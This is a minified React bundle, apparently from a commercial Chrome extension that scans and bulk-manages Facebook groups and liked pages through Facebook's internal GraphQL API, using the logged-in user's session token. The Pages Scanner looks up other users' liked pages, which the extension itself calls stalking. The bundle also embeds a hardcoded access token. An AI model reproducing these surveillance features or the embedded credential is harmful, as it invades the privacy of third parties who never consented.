Picture"})}),Object(f.jsx)(z.a,{children:Object(f.jsxs)(R.a,{md:6,className:"ml-auto mr-auto text-center",children:[Object(f.jsx)($e.a,{top:!0,src:"https://graph.facebook.com/".concat(this.state.uid,"/picture?height=500&access_token=6628568379%7Cc1e620fa708a1d5696fb991c1bde5662"),alt:"...",style:{borderRadius:"50%",width:"100%"}}),Object(f.jsx)("div",{style:e})]})}),Object(f.jsxs)(M.a,{children:[Object(f.jsx)("br",{}),Object(f.jsx)(et.a,{children:"Prevent others from downloading your Profile Picture."}),Object(f.jsx)(et.a,{children:Object(f.jsx)("div",{className:"text-danger",children:"WARNING: shield will only show for Facebook classic."})})]}),Object(f.jsxs)(Ze.a,{children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-success",onClick:()=>this.shield(!0),children:"Shield Up"}),Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:()=>this.shield(!1),children:"Shield Down"})]})]})})]})]})}}var st=tt;const at=[{label:"Group ID",key:"id"},{label:"Name",key:"name"},{label:"Membership",key:"type"},{label:"Link",key:"url"},{label:"Last visited time",key:"lastVisited"}];class it extends n.a.Component{constructor(e){super(e),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.verifyNumber=e=>new RegExp("^[0-9]+$").test(e),this.change=e=>{this.verifyNumber(e.target.value)?this.setState({isValidUID:"has-success"}):this.setState({isValidUID:"has-danger"}),this.setState({uid:e.target.value})},this.typeClick=()=>{""!==this.state.isValidUID&&this.verifyNumber(this.state.uid)?(this.joinedGroups={},this.setState({loading:!0,groups:[],gotData:null,lastFetchedUID:null,selection:{},selectAll:!1,results:"",gotDocID:{5082539561756946:!1,3141730215869953:!1}},(()=>{this.searchGroups(0xb2963117f3e01),this.searchGroups(5082539561756946)}))):this.setState({isValidUID:"has-danger"})},this.searchGroups=(e,t=null)=>{const s=new FormData;t=t?'"'.concat(t,'"'):null;const a=0xb2963117f3e01===e?"GroupsCometTabGroupMembershipListPaginationQuery":"GroupsLeftRailGroupsYouManagePaginatedQuery",i='{"count":10,"cursor":'.concat(t,0xb2963117f3e01===e?',"ordering":["viewer_added"],"scale":1}':',"scale":1}');s.append("__user",localStorage.id),s.append("__a",1),s.append("dpr",1),s.append("fb_dtsg",localStorage.dt),s.append("fb_api_caller_class","RelayModern"),s.append("fb_api_req_friendly_name",a),s.append("doc_id",e),s.append("variables",i),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((t=>{if((t=t.data).data){const s=t.data.viewer.groups_tab.tab_groups_list;if(!s.edges.length&&0xb2963117f3e01===e)return this.setState({gotData:!0,loading:!1}),this.setAlert("Error","Found no groups!","error");this.fetchGroups(s,e)}else this.setState({gotData:!0,loading:!1}),this.setAlert("Error","Something went south, contact Loc for help","error")})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");this.setState({gotData:!0,loading:!1}),e.response&&e.response.data?this.setAlert("Error",e.response.data.error.message,"error"):this.setAlert("Error","Something went south, contact Loc for help","error")}))},this.fetchGroups=(e,t)=>{if(e.edges.forEach((({node:e})=>{this.joinedGroups[e.id]&&5082539561756946===t?this.joinedGroups[e.id].type="Admin":this.joinedGroups[e.id]||(this.joinedGroups[e.id]={type:5082539561756946===t?"Admin":"Member",id:e.id,name:e.name,pic:e.profile_picture.uri,url:"https://www.facebook.com/".concat(e.id)}),e.viewer_last_visited_time&&(this.joinedGroups[e.id].lastVisited=q()(1e3*e.viewer_last_visited_time).fromNow())})),e.page_info&&e.page_info.has_next_page)return this.searchGroups(t,e.page_info.end_cursor);const s=Object.assign(this.state.gotDocID,{});s[t]=!0,this.setState({gotDocID:s},(()=>this.postTable()))},this.postTable=()=>{this.state.gotDocID[0xb2963117f3e01]&&this.state.gotDocID[5082539561756946]&&this.setState({gotData:!0,loading:!1,groups:Object.values(this.joinedGroups),selection:this.joinedGroups,lastFetchedUID:this.state.uid})},this.resetCheckbox=()=>{if(!this.checkboxTable||this.state.lastFetchedUID!==localStorage.id)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.joinedGroups);for(let o=a;o<i;o++)if(!r[e.sortedData[o].id].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.joinedGroups);for(let o=i;o<n&&(r[t.sortedData[o].id].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.joinedGroups);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.confirmLeaveGroups=()=>{if(0===this.state.groups.length)return this.setAlert("Ouch","You are not in any groups","success");const e=[];if(Object.keys(this.state.selection).forEach((t=>{this.state.selection[t].selected&&"Member"===this.state.selection[t].type&&e.push(this.state.selection[t])})),0===e.length)return this.setAlert("Ouch","No groups got selected","success");this.setState({alert:Object(f.jsxs)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.setState({loading:!0}),this.leaveGroups(e)},onCancel:()=>this.hideAlert(),confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:"Yes, delete them!",cancelBtnText:"Cancel",showCancel:!0,btnSize:"",children:[e.length," selected group",e.length>1&&"s"," will be removed!"]})})},this.leaveGroups=e=>{const t=e.shift();if(!t)return this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success");const s=new FormData;s.append("__user",localStorage.id),s.append("__a",1),s.append("dpr",1),s.append("fb_dtsg",localStorage.dt),s.append("fb_api_caller_class","RelayModern"),s.append("fb_api_req_friendly_name","useGroupLeaveMutation"),s.append("doc_id",0x72be322fd4fa1),s.append("variables",'{"input":{"group_id":"'.concat(t.id,'","readd_policy":"ALLOW_READD","source":"comet_group_page","actor_id":"').concat(localStorage.id,'","client_mutation_id":"6"}}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((s=>{if((s=s.data).data&&s.data.group_leave){const s="\ud83d\udc4b ".concat(t.name,": removed.\n").concat(this.state.results),a=this.state.groups.filter((e=>e.id!==t.id)),i=this.state.selection;i[t.id]&&(delete i[t.id],this.joinedGroups=i),this.setState({groups:a,selection:i,results:s},(()=>{this.leaveGroups(e)}))}else{const s="\u274c ".concat(t.name,": failed.\n").concat(this.state.results);this.setState({results:s}),this.leaveGroups(e)}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");const a="\u274c ".concat(t.name,": failed.\n").concat(this.state.results);this.setState({results:a}),this.leaveGroups(e)}))},this.joinedGroups={},this.state={groups:[],gotData:null,uid:localStorage.id,isValidUID:"has-success",loading:!1,lastFetchedUID:null,selection:{},selectAll:!1,alert:!1,results:"",gotDocID:{5082539561756946:!1,3141730215869953:!1}};const t=L.a.CancelToken;this.axiosSource=t.source()}componentDidMount(){ga_trackButtonClick("creepy_as_fuck")}render(){return Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-danger",children:Object(f.jsx)("i",{className:"fas fa-mask"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Groups Scanner"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})})]}),Object(f.jsx)("hr",{}),Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:"6",children:[Object(f.jsx)(Ne.a,{children:"User ID"}),Object(f.jsxs)(Ce.a,{className:this.state.isValidUID,children:[Object(f.jsx)(Ie.a,{placeholder:localStorage.id,name:"number",type:"text",value:this.state.uid,onChange:e=>this.change(e),disabled:!0}),"has-danger"===this.state.isValidUID?Object(f.jsx)("label",{className:"error",children:"Please enter a valid UID."}):null]})]}),this.state.loading&&Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})]}),Object(f.jsxs)(R.a,{md:"12",children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-info",onClick:this.typeClick,disabled:this.state.loading,children:"Search"})," ",this.state.gotData&&Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary",disabled:this.state.loading,children:Object(f.jsxs)(we.CSVLink,{data:this.state.groups,headers:at,filename:"mtfb-joined-groups-".concat(this.state.uid,".csv"),children:[Object(f.jsx)("i",{className:"fas fa-file-download"})," CSV"]})})," ",this.state.lastFetchedUID===localStorage.id&&Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:this.confirmLeaveGroups,disabled:this.state.loading,children:"Leave"})]}),this.state.lastFetchedUID===localStorage.id&&Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)("pre",{className:"card-text",style:{maxHeight:"500px",whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif"},children:this.state.results})}),this.state.gotData&&Object(f.jsx)(R.a,{md:12,children:Object(f.jsx)(Se.a,{data:this.state.groups,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:!0,sortable:!0,defaultSorted:[{id:"type",asc:!0}],getTrProps:(e,t)=>{if(t&&t.row){if("Member"===this.state.selection[t.original.id].type){return{onClick:e=>{this.state.loading||"form-check-sign"===e.target.className||"form-check-input"===e.target.className||"span-name"===e.target.className||this.handleSingleCheckboxChange(t.original.id)},style:this.state.selection[t.original.id].selected?{background:"#344675"}:{}}}return{}}return{}},resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{src:e.original.pic,alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:e.original.url,rel:"noopener noreferrer",className:"span-name",target:"_blank",children:Object(f.jsx)("span",{className:"span-name",children:e.original.name})})]}),accessor:"name",filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"Member Type",id:"type",accessor:"type",maxWidth:200,filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"Last Visited Time",id:"lastVisited",accessor:"lastVisited",maxWidth:200,filterMethod:(e,t)=>t[e.id].toLowerCase().includes(e.value.toLowerCase())},{Header:"ID",id:"id",accessor:"id",maxWidth:200,sortable:!1},{Header:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",onChange:this.handleChange,checked:this.state.selectAll,disabled:this.state.loading}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),Cell:e=>"Admin"===this.state.selection[e.original.id].type?null:Object(f.jsx)(Ce.a,{check:!0,children:Object(f.jsxs)(Ne.a,{check:!0,children:[Object(f.jsx)(Ie.a,{type:"checkbox",checked:this.state.selection[e.original.id].selected,disabled:this.state.loading,onChange:()=>this.handleSingleCheckboxChange(e.original.id)}),Object(f.jsx)("span",{className:"form-check-sign",children:Object(f.jsx)("span",{className:"check"})})]})}),show:this.state.lastFetchedUID===localStorage.id,sortable:!1,filterable:!1,maxWidth:25}],defaultPageSize:10,showPaginationTop:!0,showPaginationBottom:!1,className:"-striped -highlight"})})]})]})})]})]})}}var nt=it,ct=s(129),rt=s.n(ct),ot=s(251),lt=s(252),dt=s(241),ht=s(243),mt=s.p+"static/media/card-warning.da888537.png",pt=s.p+"static/media/card-success.b6634da7.png",bt=s.p+"static/media/card-primary.17212428.png";const gt=Object(lt.a)("pk_live_51IUK9QHFXzBK8JDhyrBwoKZwk5GP0ec3zN7nMfnJNJEnfsIQO63SqDDi9ZbQdjvLQSlWtbwcnJW8TtQi2zjapwhL00DXoR3X3H");var ut=e=>{const t=function(){var t=Object(ot.a)(rt.a.mark((function t(s){var a,i,n,c,r;return rt.a.wrap((function(t){for(;;)switch(t.prev=t.next){case 0:return t.next=2,gt;case 2:return a=t.sent,i={price:s,uid:localStorage.id},t.next=6,fetch("https://mtfb.lnmai.com/create-checkout-session",{method:"POST",headers:{Accept:"application/json","Content-Type":"application/json"},body:JSON.stringify(i)});case 6:return n=t.sent,t.next=9,n.json();case 9:return c=t.sent,t.next=12,a.redirectToCheckout({sessionId:c.id});case 12:(r=t.sent).error&&e.setAlert("Oops",r.error.message,"error");case 14:case"end":return t.stop()}}),t)})));return function(e){return t.apply(this,arguments)}}();return Object(f.jsx)("div",{className:"content",children:Object(f.jsxs)(g.a,{children:[Object(f.jsx)(z.a,{children:Object(f.jsxs)(R.a,{className:"ml-auto mr-auto text-center",md:"6",children:[Object(f.jsx)("h1",{className:"title",children:"Pick the best package for you"}),Object(f.jsx)("h4",{className:"description",children:"You will have Unlimited Updates and Support on each plan."}),Object(f.jsx)("br",{}),Object(f.jsx)("br",{})]})}),Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{lg:"4",md:"6",children:Object(f.jsxs)(E.a,{className:"card-pricing card-warning",children:[Object(f.jsxs)(M.a,{children:[Object(f.jsx)(H.a,{tag:"h1",children:"mid"}),Object(f.jsx)($e.a,{alt:"...",src:mt}),Object(f.jsxs)(dt.a,{children:[Object(f.jsx)(ht.a,{children:"Full Access"}),Object(f.jsx)(ht.a,{children:"Premium Tools"}),Object(f.jsx)(ht.a,{children:"1 Account"})]}),Object(f.jsxs)("div",{className:"card-prices",children:[Object(f.jsxs)("h3",{className:"text-on-front",children:[Object(f.jsx)("span",{children:"$"}),"20"]}),Object(f.jsx)("h5",{className:"text-on-back",children:"20"}),Object(f.jsx)("p",{className:"plan",children:"Mid"})]})]}),Object(f.jsx)(Ze.a,{className:"text-center mb-3 mt-3",children:Object(f.jsx)(u.a,{className:"btn-round",color:"info",onClick:()=>t(20),children:"Checkout"})})]})}),Object(f.jsx)(R.a,{lg:"4",md:"6",children:Object(f.jsxs)(E.a,{className:"card-pricing card-success",children:[Object(f.jsxs)(M.a,{children:[Object(f.jsx)(H.a,{tag:"h1",children:"pro"}),Object(f.jsx)($e.a,{alt:"...",src:pt}),Object(f.jsxs)(dt.a,{children:[Object(f.jsx)(ht.a,{children:"Full Access"}),Object(f.jsx)(ht.a,{children:"Premium Tools"}),Object(f.jsx)(ht.a,{children:"2 Accounts"})]}),Object(f.jsxs)("div",{className:"card-prices",children:[Object(f.jsxs)("h3",{className:"text-on-front",children:[Object(f.jsx)("span",{children:"$"}),"30"]}),Object(f.jsx)("h5",{className:"text-on-back",children:"30"}),Object(f.jsx)("p",{className:"plan",children:"Pro"})]})]}),Object(f.jsx)(Ze.a,{className:"text-center mb-3 mt-3",children:Object(f.jsx)(u.a,{className:"btn-round",color:"info",onClick:()=>t(30),children:"Checkout"})})]})}),Object(f.jsx)(R.a,{lg:"4",md:"6",children:Object(f.jsxs)(E.a,{className:"card-pricing card-primary",children:[Object(f.jsxs)(M.a,{children:[Object(f.jsx)(H.a,{tag:"h1",children:"Elite"}),Object(f.jsx)($e.a,{alt:"...",src:bt}),Object(f.jsxs)(dt.a,{children:[Object(f.jsx)(ht.a,{children:"Full Access"}),Object(f.jsx)(ht.a,{children:"Premium Supports"}),Object(f.jsx)(ht.a,{children:"3 Accounts"})]}),Object(f.jsxs)("div",{className:"card-prices",children:[Object(f.jsxs)("h3",{className:"text-on-front",children:[Object(f.jsx)("span",{children:"$"}),"40"]}),Object(f.jsx)("h5",{className:"text-on-back",children:"40"}),Object(f.jsx)("p",{className:"plan",children:"Elite"})]})]}),Object(f.jsx)(Ze.a,{className:"text-center mb-3 mt-3",children:Object(f.jsx)(u.a,{className:"btn-round",color:"info",onClick:()=>t(40),children:"Checkout"})})]})})]}),Object(f.jsxs)(z.a,{children:[e.aw2721d&&Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("blockquote",{children:Object(f.jsxs)("p",{className:"blockquote blockquote-danger",children:["You are already a Premium user. If you are looking to buy Premium for your friends, please",Object(f.jsxs)("a",{href:"mailto:locmai88@gmail.com",target:"_blank",rel:"noopener noreferrer",children:[" ","contact me"]})," ","for help."]})}),Object(f.jsx)("br",{})]}),Object(f.jsx)(R.a,{className:"mt-5",md:"12",children:Object(f.jsx)("h3",{className:"title",children:"Premium Tools"})}),Object(f.jsxs)(R.a,{md:"6",children:[Object(f.jsxs)("p",{children:["$20 to become a Premium user. You get access to premium tools such as downloading group, non-friends and even blocked user's conversation history. Gain better insight into your friends' interaction with you. Find locked and deactivated friends to remove. Most importantly, unlimited supports and I will survive to continue improving this extension"," ",Object(f.jsx)("span",{role:"img","aria-label":"smiley",children:"\ud83d\ude0a"}),"."]}),Object(f.jsx)("p",{children:"Note: premium status is attached to your Facebook account. Switching to different Facebook accounts may not work."}),Object(f.jsx)("br",{})]}),Object(f.jsxs)(R.a,{className:"ml-auto",md:"6",children:[Object(f.jsxs)("div",{className:"progress-container progress-warning",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Premium User"}),Object(f.jsx)(Pe.a,{max:"100",value:"100"})]}),Object(f.jsxs)("div",{className:"progress-container progress-primary",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Free User"}),Object(f.jsx)(Pe.a,{max:"100",value:"50"})]})]})]})]})})};class xt extends n.a.Component{constructor(){super(),this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.componentDidMount=()=>{pe().then((e=>{const t=De.a.decrypt(this.state.locmai,e);t===this.state.locmai?(this.setState({aw2721d:!0}),this.setAlert("","You are already a Premium user!","success")):(this.setState({aw2721d:!1}),this.setAlert("",t,"info"))})).catch((()=>{this.setState({aw2721d:null})}))},this.state={aw2721d:null,alert:null,locmai:localStorage.id}}render(){return Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsx)(z.a,{children:Object(f.jsx)(R.a,{md:12,children:null===this.state.aw2721d?Object(f.jsx)(E.a,{children:Object(f.jsx)(M.a,{children:Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})})})}):Object(f.jsx)(ut,{setAlert:this.setAlert,aw2721d:this.state.aw2721d})})})]})}}var jt=xt;const ft=[{label:"Page ID",key:"id"},{label:"Name",key:"name"},{label:"Link",key:"url"}];class Ot extends n.a.Component{constructor(e){super(e),this.componentWillUnmount=()=>{this.axiosSource.cancel()},this.verifyNumber=e=>new RegExp("^[0-9]+$").test(e),this.change=e=>{const t=e.target.value.trim();this.verifyNumber(t)?this.setState({isValidUID:"has-success"}):this.setState({isValidUID:"has-danger"}),this.setState({uid:t})},this.typeClick=()=>{""!==this.state.isValidUID&&this.verifyNumber(this.state.uid)?(this.likedPages={},this.setState({loading:!0,pages:[],gotData:null,lastFetchedUID:null,selection:{},selectAll:!1,results:"",progress:0},(()=>{this.searchPages()}))):this.setState({isValidUID:"has-danger"})},this.fetchPage=e=>{if(e.edges.forEach((({node:e})=>{this.likedPages[e.node.id]={id:e.node.id,name:e.title.text,url:e.node.url,image:e.image.uri,selected:!1}})),e.page_info&&e.page_info.has_next_page)return this.searchPages(e.page_info.end_cursor);this.setState({lastFetchedUID:this.state.uid,selection:this.likedPages,loading:!1,pages:Object.keys(this.likedPages).map((e=>this.likedPages[e])),gotData:!0},(()=>{const e=document.querySelector("select"),t=document.createElement("option");t.appendChild(document.createTextNode("All rows")),t.setAttribute("value",this.state.pages.length),e.appendChild(t)}))},this.searchPages=(e=null)=>{const t=new FormData;e=e?'"'.concat(e,'"'):null,t.append("__user",localStorage.id),t.append("__a",1),t.append("dpr",1),t.append("fb_dtsg",localStorage.dt),t.append("fb_api_caller_class","RelayModern"),t.append("fb_api_req_friendly_name","ProfileCometAppCollectionGridRendererPaginationQuery"),t.append("variables",'{"count":8,"cursor":'.concat(e,',"scale":1,"id":"').concat(ge(this.state.uid,2409997254,96),'"}')),t.append("doc_id",0xa9965508065ef),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:t,cancelToken:this.axiosSource.token}).then((e=>{if((e=e.data).data){const t=e.data.node.items;if(0===t.count)return this.setState({gotData:!0,loading:!1}),this.setAlert("Error","Found no pages!","error");this.setState({progress:parseInt((Object.keys(this.likedPages).length+t.edges.length)/t.count*100)}),this.fetchPage(t)}else this.setState({gotData:!0,loading:!1}),this.setAlert("Error","Something went south, contact Loc for help","error")})).catch((e=>{if(L.a.isCancel(e))return console.log("Loc is the best");this.setState({gotData:!0,loading:!1}),e.response&&e.response.data&&e.response.data.error?this.setAlert("Error",e.response.data.error.message,"error"):this.setAlert("Error","Something went south, contact Loc for help","error")}))},this.resetCheckbox=()=>{if(!this.checkboxTable||this.state.lastFetchedUID!==localStorage.id)return;const e=this.checkboxTable.state,t=e.page,s=e.pageSize,a=t*s;let i=a+s;const n=e.sortedData.length-s*t;n<s&&(i=a+n);let c=!0;const r=Object.assign({},this.likedPages);for(let o=a;o<i;o++)if(!r[e.sortedData[o].id].selected){c=!1;break}this.setState({selectAll:c})},this.handleChange=()=>{const e=!this.state.selectAll,t=this.checkboxTable.state,s=t.page,a=t.pageSize,i=s*a;let n=i+a;const c=t.sortedData.length-a*s;c<a&&(n=i+c);const r=Object.assign({},this.likedPages);for(let o=i;o<n&&(r[t.sortedData[o].id].selected=e,t.sortedData[o+1]);o++);this.setState({selection:r,selectAll:e})},this.handleSingleCheckboxChange=e=>{const t=Object.assign({},this.likedPages);t[e].selected=!t[e].selected,!t[e].selected&&this.state.selectAll&&this.setState({selectAll:!1}),this.setState({selection:t})},this.hideAlert=()=>{this.setState({alert:null})},this.setAlert=(e,t,s)=>{this.setState({alert:Object(f.jsx)(p.a,{type:s,style:{display:"block"},title:e,onConfirm:()=>this.hideAlert(),onCancel:()=>this.hideAlert(),btnSize:"",children:t})})},this.confirmUnlikePages=()=>{if(0===this.state.pages.length)return this.setAlert("Ouch","You liked no pages","success");const e=[];if(Object.keys(this.state.selection).forEach((t=>{this.state.selection[t].selected&&e.push(this.state.selection[t])})),0===e.length)return this.setAlert("Ouch","No pages got selected","success");this.setState({alert:Object(f.jsxs)(p.a,{warning:!0,style:{display:"block"},title:"Are you sure?",onConfirm:()=>{this.hideAlert(),this.setState({loading:!0}),this.unlikePages(e)},onCancel:()=>this.hideAlert(),confirmBtnBsStyle:"success",cancelBtnBsStyle:"danger",confirmBtnText:"Yes, unlike them!",cancelBtnText:"Cancel",showCancel:!0,btnSize:"",children:[e.length," selected page",e.length>1&&"s"," will be removed!"]})})},this.unlikePages=e=>{const t=e.shift();if(!t)return this.setState({selectAll:!1,loading:!1}),this.setAlert("Finished","Job's done!","success");const s=new FormData;s.append("__user",localStorage.id),s.append("__a",1),s.append("dpr",1),s.append("fb_dtsg",localStorage.dt),s.append("fb_api_caller_class","RelayModern"),s.append("fb_api_req_friendly_name","CometPageUnlikeCommitMutation"),s.append("doc_id",0xacc43f6047e0a),s.append("variables",'{"input":{"is_tracking_encrypted":true,"page_id":"'.concat(t.id,'","tracking":[],"actor_id":"').concat(localStorage.id,'","client_mutation_id":"8"}}')),L()({method:"POST",url:"https://www.facebook.com/api/graphql/",data:s,cancelToken:this.axiosSource.token}).then((s=>{if((s=s.data).data&&s.data.page_unlike){const s="\ud83d\udc4b ".concat(t.name,": removed.\n").concat(this.state.results),a=this.state.pages.filter((e=>e.id!==t.id)),i=this.state.selection;i[t.id]&&(delete i[t.id],this.likedPages=i),this.setState({pages:a,selection:i,results:s},(()=>{this.unlikePages(e)}))}else{const s="\u274c ".concat(t.name,": failed.\n").concat(this.state.results);this.setState({results:s}),this.unlikePages(e)}})).catch((s=>{if(L.a.isCancel(s))return console.log("Loc is the best");const a="\u274c ".concat(t.name,": failed.\n").concat(this.state.results);this.setState({results:a}),this.unlikePages(e)}))},this.likedPages={},this.state={pages:[],gotData:null,uid:localStorage.id,isValidUID:"has-success",loading:!1,lastFetchedUID:null,selection:{},selectAll:!1,alert:!1,results:"",progress:0};const t=L.a.CancelToken;this.axiosSource=t.source()}componentDidMount(){ga_trackButtonClick("creepy_as_fuck")}render(){return Object(f.jsxs)("div",{className:"content",children:[this.state.alert,Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)(je,{stats:!1})}),Object(f.jsx)(E.a,{className:"card-stats",children:Object(f.jsxs)(M.a,{children:[Object(f.jsxs)(z.a,{children:[Object(f.jsx)(R.a,{md:"4",children:Object(f.jsx)("div",{className:"info-icon text-center icon-danger",children:Object(f.jsx)("i",{className:"fas fa-mask"})})}),Object(f.jsx)(R.a,{md:"8",children:Object(f.jsxs)("div",{className:"numbers",children:[Object(f.jsx)("p",{className:"card-category",children:"Pages Scanner"}),Object(f.jsxs)(H.a,{tag:"h3",children:["v",chrome.app.getDetails().version]})]})}),Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("blockquote",{children:Object(f.jsx)("p",{className:"blockquote blockquote-danger",children:"Stalk your friends and see what pages they liked."})}),Object(f.jsx)("br",{})]})]}),Object(f.jsx)("hr",{}),Object(f.jsxs)(z.a,{children:[Object(f.jsxs)(R.a,{md:"6",children:[Object(f.jsx)(Ne.a,{children:"User ID"}),Object(f.jsxs)(Ce.a,{className:this.state.isValidUID,children:[Object(f.jsx)(Ie.a,{placeholder:"Please enter a valid UID - ex 806399409",name:"number",type:"text",value:this.state.uid,onChange:e=>this.change(e),disabled:this.state.loading}),"has-danger"===this.state.isValidUID?Object(f.jsx)("label",{className:"error",children:"Please enter a valid UID."}):null]})]}),this.state.loading&&Object(f.jsxs)(R.a,{md:12,children:[Object(f.jsx)("br",{}),Object(f.jsx)("h1",{className:"text-center",children:Object(f.jsx)("i",{className:"fas fa-spin fa-spinner"})}),Object(f.jsx)(z.a,{children:Object(f.jsx)(R.a,{md:12,children:Object(f.jsxs)("div",{className:"progress-container progress-success",children:[Object(f.jsx)("span",{className:"progress-badge",children:"Fetching..."}),Object(f.jsx)(Pe.a,{max:"100",value:this.state.progress,children:Object(f.jsxs)("span",{className:"progress-value",children:[this.state.progress,"%"]})})]})})})]}),Object(f.jsxs)(R.a,{md:"12",children:[Object(f.jsx)(u.a,{className:"btn btn-simple btn-info",onClick:this.typeClick,disabled:this.state.loading,children:"Search"})," ",this.state.gotData&&Object(f.jsx)(u.a,{className:"btn btn-simple btn-primary",disabled:this.state.loading,children:Object(f.jsxs)(we.CSVLink,{data:this.state.pages,headers:ft,filename:"mtfb-liked-pages-".concat(this.state.uid,".csv"),children:[Object(f.jsx)("i",{className:"fas fa-file-download"})," CSV"]})})," ",this.state.lastFetchedUID===localStorage.id&&Object(f.jsx)(u.a,{className:"btn btn-simple btn-danger",onClick:this.confirmUnlikePages,disabled:this.state.loading,children:"Unlike"})]}),this.state.lastFetchedUID===localStorage.id&&Object(f.jsx)(R.a,{md:"12",children:Object(f.jsx)("pre",{className:"card-text",style:{maxHeight:"500px",whiteSpace:"pre-wrap",fontFamily:"Poppins,sans-serif"},children:this.state.results})}),this.state.gotData&&Object(f.jsx)(R.a,{md:12,children:Object(f.jsx)(Se.a,{data:this.state.pages,ref:e=>this.checkboxTable=e,onFetchData:()=>this.resetCheckbox(),noDataText:"Loc couldn't find any data ._.",filterable:!0,sortable:!0,defaultSorted:[{id:"type",asc:!0}],getTrProps:(e,t)=>{if(t&&t.row){return{onClick:e=>{this.state.loading||"form-check-sign"===e.target.className||"form-check-input"===e.target.className||"span-name"===e.target.className||this.handleSingleCheckboxChange(t.original.id)},style:this.state.selection[t.original.id].selected?{background:"#344675"}:{}}}return{}},resizable:!1,columns:[{Header:"Name",Cell:e=>Object(f.jsxs)("div",{children:[Object(f.jsx)("img",{src:e.original.image,alt:"",style:{marginRight:"15px",width:"50px",height:"50px"}}),Object(f.jsx)("a",{href:e.original.url,rel:"noopener 